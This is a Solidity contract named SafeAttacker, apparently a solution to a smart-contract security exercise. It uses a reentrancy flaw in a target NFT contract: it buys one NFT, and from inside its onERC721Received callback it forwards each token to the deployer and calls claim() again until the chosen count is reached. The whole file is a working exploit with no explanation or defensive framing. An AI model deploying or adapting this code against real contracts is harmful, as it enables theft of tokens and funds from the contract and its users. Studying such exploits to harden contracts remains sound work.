// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface ISafeNft {
    function buyNFT() external payable;

    function claim() external;
}

contract SafeAttacker is IERC721Receiver {
    uint256 private claimed;
    uint256 private count;
    address private immutable owner;
    IERC721 private immutable target;
    ISafeNft private immutable safeNftContract;

    constructor(address _targetAddress) {
        target = IERC721(_targetAddress);
        safeNftContract = ISafeNft(_targetAddress);
        owner = msg.sender;
    }

    function attack(uint256 _count) external payable {
        count = _count;
        safeNftContract.buyNFT{value: msg.value}();
        safeNftContract.claim();
    }

    function claimNext() internal {
        claimed++;
        // claimming until count
        if (claimed != count) {
            safeNftContract.claim();
        }
    }

    function onERC721Received(
        address, /*operator*/
        address, /*from*/
        uint256 tokenId,
        bytes calldata /*data*/
    ) external override returns (bytes4) {
        target.transferFrom(address(this), owner, tokenId);

        claimNext();

        return IERC721Receiver.onERC721Received.selector;
    }
}
